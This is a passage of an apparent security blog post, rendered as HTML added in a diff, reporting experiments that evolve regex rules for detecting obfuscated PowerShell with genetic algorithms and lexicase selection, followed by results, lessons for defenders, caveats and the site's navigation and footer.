+					<td><strong>Highest</strong>: cheap to add, built for exactly our many-test-case setup</td>
+			</tr>
+			<tr>
+					<td>Reward being <em>behaviourally different</em>, not just higher-scoring, so the search can&rsquo;t settle on a deceptive peak</td>
+					<td><strong>Novelty search / MAP-Elites</strong> (&ldquo;quality-diversity&rdquo;, 2011+)</td>
+					<td>Medium: we already compute a behaviour fingerprint per rule</td>
+			</tr>
+			<tr>
+					<td>Replace the random breeding moves with a <em>language model that proposes edits</em></td>
+					<td><strong>LLM-guided evolution</strong> (FunSearch, 2023+)</td>
+					<td>High for wall 2; on-theme for this talk. Planned as the next experiment</td>
+			</tr>
+			<tr>
+					<td>Breed on what a rule <em>does</em> rather than how it is written, giving a smoother landscape</td>
+					<td><strong>Semantic GP</strong> (2012+)</td>
+					<td>Lower: elegant, but known to cause rules to balloon in size</td>
+			</tr>
+	</tbody>
+</table>
+<p>One caution we want to be upfront about: this review comes from search-result summaries and abstracts,
+not from reading every paper in full, so we treat the specifics as leads to verify rather than facts
+to quote. The closest prior art to our <em>exact task</em> is the work of Bartoli and colleagues on evolving
+regexes for text extraction, which we cite throughout.</p>
+<p>We picked <strong>lexicase selection</strong> first: it was the cheapest to build, and it targets the wall we had
+already seen cross (wall 1) rather than the one we hadn&rsquo;t.</p>
+<h3 id="exp-7protect-the-specialists-lexicase-selection-a-big-win-on-wall-1">Exp 7Protect the specialists: lexicase selection (a big win on wall 1)</h3>
+<p>Here is the problem lexicase solves, in a security analogy. Imagine ranking your analysts by their
+<strong>average</strong> score across every alert type. The one analyst who is the <em>only person who reliably
+catches a rare evasion technique</em> but is mediocre on routine alerts gets an unremarkable average and
+is let goand the team loses the one skill it was missing. That is exactly what our selection step
+was doing: scoring each regex by its average over all commands, so a rule that nailed the hard
+obfuscated cases but was mediocre on easy ones got averaged out of existence.</p>
+<p><strong>Lexicase selection</strong> picks parents differently. It shuffles the individual test commands and walks
+through them one at a time, each time keeping only the candidates that did <em>best on that specific
+command</em>, until one is left. A rule that is the sole best on even one hard case can win and breed. We
+changed <em>only</em> the selection step and nothing else, ran six attempts each way, and compared:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Selection method</th>
+					<th>Attempts that beat the keyword floor</th>
+					<th>Typical (median) F1</th>
+					<th>Typical generation of breakthrough</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Original (&ldquo;keep the best average&rdquo;)</td>
+					<td>3 of 6</td>
+					<td>0.57 (<strong>below</strong> the floor)</td>
+					<td>~generation 107 (and only 3 of 6 ever got there)</td>
+			</tr>
+			<tr>
+					<td><strong>Lexicase</strong></td>
+					<td><strong>6 of 6</strong></td>
+					<td><strong>0.69</strong> (above the floor)</td>
+					<td><strong>~generation 27</strong> (all 6 got there)</td>
+			</tr>
+	</tbody>
+</table>
+<p>Two things to take from that table:</p>
+<ul>
+<li><strong>It broke wall 1 early and reliably.</strong> Every lexicase attempt climbed off the fragment plateau,
+at a typical generation of 27 versus 107roughly <strong>four times sooner</strong>. The <em>typical</em> lexicase run
+is now a usable detector; the typical run under the old method was not. Before, we needed to run
+about seven attempts in parallel and hope one escaped; now almost any single attempt works.</li>
+<li><strong>It did not touch wall 2.</strong> The best lexicase result was 0.72 (the original method&rsquo;s best was
+0.68)still far from the expert&rsquo;s 1.0. That is exactly what the mechanism predicts: lexicase
+changes <em>who gets to breed</em>, not <em>what the breeding moves are able to build</em>. The rules it found
+still use the <code>\w+</code> shortcut and still cannot assemble the noise-skipping structure.
+<em>(Figure: <code>exp7_EXEC_lexicase.png</code>.)</em></li>
+</ul>
+<p>That makes the two walls cleanly separable, which is itself a useful result: <strong>wall 1 is a selection
+problem and lexicase fixes it; wall 2 is an operator problem and needs a different tool.</strong></p>
+
+
+
+
+
+
+
+
+<blockquote class="blockquote-regular">
+  <p><strong>A note on the prediction game.</strong> Before running this we each wrote down a guess. The learner
+predicted the breakthrough would come earlier (about generation 80-90) and, optimistically, that the
+ceiling would break past 0.70. The first half was right and the effect was larger than guessed
+(generation 27); the ceiling did not move, which the learner had hedged on (&ldquo;it might take the
+operator change&rdquo;). Writing the guess down <em>first</em> is what let us see which part of our intuition
+held up.</p>
+
+</blockquote>
+<hr>
+<h2 id="6-the-bottom-line">6. The bottom line</h2>
+<p>Stacking the experiments up, the ~0.70 ceiling has a clean explanation, with every alternative ruled
+out:</p>
+<table>
+	<thead>
+			<tr>
+					<th>We suspected&hellip;</th>
+					<th>Experiment</th>
+					<th>Verdict</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>It learned nothing</td>
+					<td>1</td>
+					<td>Stalls on fragments, below the floor</td>
+			</tr>
+			<tr>
+					<td>Bad building blocks</td>
+					<td>2</td>
+					<td>No random blocks are worse</td>
+			</tr>
+			<tr>
+					<td>The length penalty</td>
+					<td>3</td>
+					<td>No no effect, no bloat</td>
+			</tr>
+			<tr>
+					<td>Not enough search time</td>
+					<td>4</td>
+					<td>Partly more time -&gt; occasional breakthrough</td>
+			</tr>
+			<tr>
+					<td>Breakthrough is unreliable</td>
+					<td>5</td>
+					<td>Solvable ~36-56% per run, so run several</td>
+			</tr>
+			<tr>
+					<td>Missing materials / too-tight limits</td>
+					<td>6</td>
+					<td>No given the part and the room, still stuck</td>
+			</tr>
+			<tr>
+					<td>Averaging scores kills the specialists</td>
+					<td>7</td>
+					<td><strong>Yes, for wall 1</strong> lexicase: 6/6 attempts beat the floor, ~4x sooner</td>
+			</tr>
+			<tr>
+					<td><strong>Left standing: the breeding operators can&rsquo;t assemble the structure</strong></td>
+					<td></td>
+					<td><strong>This is wall 2</strong></td>
+			</tr>
+	</tbody>
+</table>
+<p><strong>So: a genetic algorithm can evolve a plain, portable, human-readable regex that beats a naive
+keyword detector for obfuscated PowerShell. With a selection method that protects specialists
+(lexicase), it does so on almost every attempt rather than one in three. But it still cannot, with
+these breeding operations, reach the quality a skilled analyst hand-writes, because it cannot
+assemble the repeating noise-skipping structure not for lack of ingredients, and not for lack of
+selection pressure, but for lack of the right <em>moves</em>.</strong></p>
+<p>The two walls need two different cures, which is the most transferable finding here:</p>
+<table>
+	<thead>
+			<tr>
+					<th></th>
+					<th>Wall 1: stuck on &ldquo;good enough&rdquo;</th>
+					<th>Wall 2: can&rsquo;t build the structure</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>What it is</td>
+					<td>A <strong>selection</strong> problem: good-but-unfinished ideas get weeded out</td>
+					<td>An <strong>operator</strong> problem: the breeding moves can&rsquo;t construct it</td>
+			</tr>
+			<tr>
+					<td>What worked</td>
+					<td>More time (Exp 4-5), then <strong>lexicase</strong> (Exp 7)</td>
+					<td>Nothing yet. More parts (Exp 6) and better selection (Exp 7) both failed to help</td>
+			</tr>
+			<tr>
+					<td>What is left to try</td>
+					<td>Done, for practical purposes</td>
+					<td>A smarter move: a human-written &ldquo;insert a noise-skip here&rdquo; edit, or a language model proposing edits (planned next)</td>
+			</tr>
+	</tbody>
+</table>
+<p>That is a genuinely useful, result not &ldquo;AI solved detection&rdquo; and not &ldquo;it failed,&rdquo; but a
+precise map of <em>where</em> automated rule-evolution helps and <em>where</em> it quietly stalls.</p>
+<h3 id="what-a-defender-should-take-from-this">What a defender should take from this</h3>
+<ul>
+<li><strong>&ldquo;Let the machine write our detections&rdquo; has a sharp edge.</strong> It will happily reach a mediocre rule
+that looks like it works, and it will <em>cheat</em> on any scoreboard you give it (the <code>-e</code> incident).
+Your yardsticks and your test data matter more than the algorithm.</li>
+<li><strong>Reward hacking is the same brittleness you already fight.</strong> A rule that scores great in the lab by
+latching onto a coincidence is a lab artefact, not a detection. Measuring the <em>right</em> thing (which
+characters, not just yes/no) is what killed the cheat.</li>
+<li><strong>Automation reaches the &ldquo;obvious&rdquo; rule fast and the &ldquo;expert&rdquo; rule not at all.</strong> The last mile
+the structured cleverness that defeats real obfuscation is exactly where it stalled. That&rsquo;s the
+part worth a human&rsquo;s time.</li>
+<li><strong>How you pick winners matters as much as how you score them.</strong> Ranking candidates by their
+<em>average</em> quietly discarded the specialists, and swapping in a method that judges case by case
+(lexicase) turned a one-in-three coin flip into a near-certainty. If you tune detections with any
+automated search, ask what your selection rule throws away.</li>
+<li><strong>Check what the field already knows before inventing a fix.</strong> Our &ldquo;stuck on a good-enough answer&rdquo;
+problem is a classic one with decades of literature. A short, literature review pointed us
+at a cheap, well-matched fix instead of a bespoke one, and an LLM helped with both the search and
+the implementation. (We did not time it against doing it unaided, so we make no speed claim.)</li>
+</ul>
+<hr>
+<h2 id="7-caveats">7. Caveats</h2>
+<ul>
+<li><strong>Synthetic data.</strong> We generated and obfuscated the samples ourselves. Real attacker PowerShell is
+messier; these numbers describe <em>our</em> generator, not the wild. The <em>method and the failure mode</em>
+are the transferable findings, not the exact 0.70.</li>
+<li><strong>&ldquo;Expert defines right.&rdquo;</strong> Our ceiling is a human-written regex. We&rsquo;re measuring &ldquo;can evolution
+rediscover what an expert would write,&rdquo; not &ldquo;can it beat an expert.&rdquo;</li>
+<li><strong>Small samples on the final probe.</strong> The last experiment is 3-4 runs per condition (the big runs
+are slow). The conclusion rests on the <em>mechanism</em> we can see in the evolved patterns brick
+picked up but not assembled not on tight statistics.</li>
+<li><strong>Six attempts per side on the lexicase result.</strong> The headline numbers (6 of 6 beat the floor,
+breakthrough around generation 27 versus 107) are large and consistent, but six runs is small. One
+extra or missing run moves the simple &ldquo;escape rate&rdquo; by about 17 percentage points, so we lean on
+the size of the gap rather than the exact figures. Also, the original method&rsquo;s &ldquo;generation 107&rdquo;
+is the typical value among the three attempts that broke through at all.</li>
+<li><strong>The literature review is a skim, not a survey.</strong> It was built from search-result summaries and
+abstracts, not full reads of every paper, and the notes say so. Treat the named methods as
+well-motivated leads, and verify specifics before quoting them.</li>
+<li><strong>One indicator so far.</strong> All of this is the <code>Invoke-Expression</code> slot. The full detector combines
+several such slots (fire if <em>k of n</em> indicators are present); that&rsquo;s the next phase.</li>
+<li><strong>Wall 2 is still open.</strong> We have shown <em>where</em> the evolved rules stop and ruled out several
+explanations, but we have not yet shown a fix. The planned next experiment (a language model
+proposing the edits) is a test, not a promise.</li>
+</ul>
+<hr>
+
+      </div>
+
+      
+
+
+      <nav class="post-navigation" aria-label="Post navigation">
+        
+
+        
+          <a
+            href="/posts/hello-there/"
+            class="nav-link nav-next"
+            aria-label="Next post: Building the worlds worst Machine Learning Detection engine">
+            <span class="nav-label">Next</span>
+            <span class="nav-title">Building the worlds worst Machine Learning Detection engine</span>
+          </a>
+        
+      </nav>
+    </article>
+
+    
+  <aside class="post-toc" id="post-toc" aria-label="Table of contents">
+    <button
+      class="toc-toggle"
+      id="toc-toggle"
+      aria-expanded="true"
+      aria-controls="toc-content"
+      aria-label="Toggle table of contents">
+      <svg
+        class="toc-burger-icon"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        aria-hidden="true">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+      <span class="toc-toggle-text">Table of Contents</span>
+      <svg
+        class="toc-chevron-icon"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        aria-hidden="true">
+        <polyline points="6 9 12 15 18 9"></polyline>
+      </svg>
+    </button>
+    <div class="toc-content" id="toc-content">
+      <nav class="toc-nav" aria-label="Table of contents">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#can-we-get-a-model-to-evolve-its-own-detection-rules">Can we get a Model to Evolve Its Own Detection Rules?</a>
+      <ul>
+        <li><a href="#prologue-mario-inspiration">Prologue: MarI/O inspiration</a></li>
+        <li><a href="#0-the-whole-story-in-a-few-sentences">0. The whole story in a few sentences</a></li>
+        <li><a href="#1-the-problem-every-detection-engineer-already-knows">1. The problem every detection engineer already knows</a></li>
+        <li><a href="#2-the-tool-were-evolving-a-regex">2. The tool we&rsquo;re evolving: a regex</a></li>
+        <li><a href="#3-evolution-applied-to-search-rules-no-maths-promise">3. Evolution, applied to search rules (no maths, promise)</a></li>
+        <li><a href="#4-a-fair-test-bench-this-is-where-most-it-works-demos-cheat">4. A fair test bench (this is where most &ldquo;it works!&rdquo; demos cheat)</a>
+          <ul>
+            <li><a href="#41-labelled-defanged-data">4.1 Labelled, defanged data</a></li>
+            <li><a href="#42-two-yardsticks-the-floor-and-the-expert-ceiling">4.2 Two yardsticks: the floor and the expert ceiling</a></li>
+            <li><a href="#43-score-the-characters-not-just-yesno-how-we-stopped-it-cheating">4.3 Score the characters, not just yes/no (how we stopped it cheating)</a></li>
+          </ul>
+        </li>
+        <li><a href="#5-what-happened-a-detective-story-in-seven-experiments">5. What happened: a detective story in seven experiments</a>
+          <ul>
+            <li><a href="#exp-1-the-first-run-it-stalls-below-the-baseline">Exp 1 The first run: it stalls <em>below</em> the baseline</a></li>
+            <li><a href="#exp-2-is-it-the-ingredients-no">Exp 2 Is it the ingredients? (No.)</a></li>
+            <li><a href="#exp-3-is-it-our-keep-it-short-rule-no">Exp 3 Is it our &ldquo;keep it short&rdquo; rule? (No.)</a></li>
+            <li><a href="#exp-4-does-it-just-need-more-time-partly-a-breakthrough">Exp 4 Does it just need more time? (Partly a breakthrough!)</a></li>
+            <li><a href="#exp-5-can-we-make-the-breakthrough-reliable-yes-with-restarts">Exp 5 Can we make the breakthrough reliable? (Yes with restarts.)</a></li>
+            <li><a href="#exp-6-the-second-wall-missing-materials-or-missing-skill-skill">Exp 6 The second wall: missing <em>materials</em>, or missing <em>skill</em>? (Skill.)</a></li>
+            <li><a href="#interludehas-anyone-solved-stuck-on-a-good-enough-answer-before">Interludehas anyone solved &ldquo;stuck on a good-enough answer&rdquo; before?</a></li>
+            <li><a href="#exp-7protect-the-specialists-lexicase-selection-a-big-win-on-wall-1">Exp 7Protect the specialists: lexicase selection (a big win on wall 1)</a></li>
+          </ul>
+        </li>
+        <li><a href="#6-the-bottom-line">6. The bottom line</a>
+          <ul>
+            <li><a href="#what-a-defender-should-take-from-this">What a defender should take from this</a></li>
+          </ul>
+        </li>
+        <li><a href="#7-caveats">7. Caveats</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </nav>
+    </div>
+  </aside>
+
+
+  </div>
+
+    </main>
+
+    <footer>
+      <footer class="site-footer">
+  <div class="footer-content">
+    <p class="footer-text">
+      &copy;
+      
+      2026
+      
+      Blog.
+      
+    </p>
+    
+      <div class="footer-social">
+        <div class="social-links">
+  
+    <a
+      href="https://github.com/Pr0kythera"
+      target="_blank"
+      rel="noopener noreferrer"
+      class="social-link"
+      aria-label="GitHub">
+      <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          fill-rule="evenodd"
+          d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"
+          clip-rule="evenodd"></path>
+      </svg>
+    </a>
+  
+
+  
+    <a
+      href="https://www.linkedin.com/in/martin-t-16225580/"
+      target="_blank"
+      rel="noopener noreferrer"
+      class="social-link"
+      aria-label="LinkedIn">
+      <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path>
+      </svg>
+    </a>
+  
+
+  
+    <a href="mailto:contact.prokythera@gmail.com" class="social-link" aria-label="Email">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
+      </svg>
+    </a>
+  
+</div>
+
+      </div>
+    
+  </div>
+</footer>
+
+    </footer>
+
+    <div id="search-modal" class="search-modal" aria-hidden="true" role="dialog" aria-label="Search">
+  <div class="search-modal-backdrop" id="search-modal-backdrop"></div>
+  <div class="search-modal-container">
+    <div class="search-input-wrapper">
+      <svg class="search-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+      </svg>
+      <input
+        type="search"
+        id="search-input"
+        class="search-input"
+        placeholder="Search..."
+        autocomplete="off"
+        aria-label="Search input">
+      <button class="search-input-clear" id="search-input-clear" aria-label="Clear search">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+        </svg>
+      </button>
+      <button class="search-modal-close" id="search-modal-close" aria-label="Close search">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M6 18L18 6M6 6l12 12"></path>
+        </svg>
+      </button>
+    </div>
+    <div id="search-results" class="search-results"></div>
+  </div>
+</div>
+
+    
+  <script
+    data-name="BMC-Widget"
+    data-cfasync="false"
+    src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js"
+    data-id="yourwidgetid"
+    data-description="Support me on Buy me a coffee!"
+    data-message=""
+    data-color="#BD5FFF"
+    data-position="Right"
+    data-x_margin="18"
+    data-y_margin="18"></script>
+
+
+    <button id="scroll-to-top" class="scroll-to-top" aria-label="Scroll to top" type="button">
+  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+  </svg>
+</button>
+
+
+    
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.min.e60ab79dca7b920b4dc5cf3163ad5ce8794839b60f27778db65782f087be3e27.js" defer></script>
+
+  </body>
+</html>
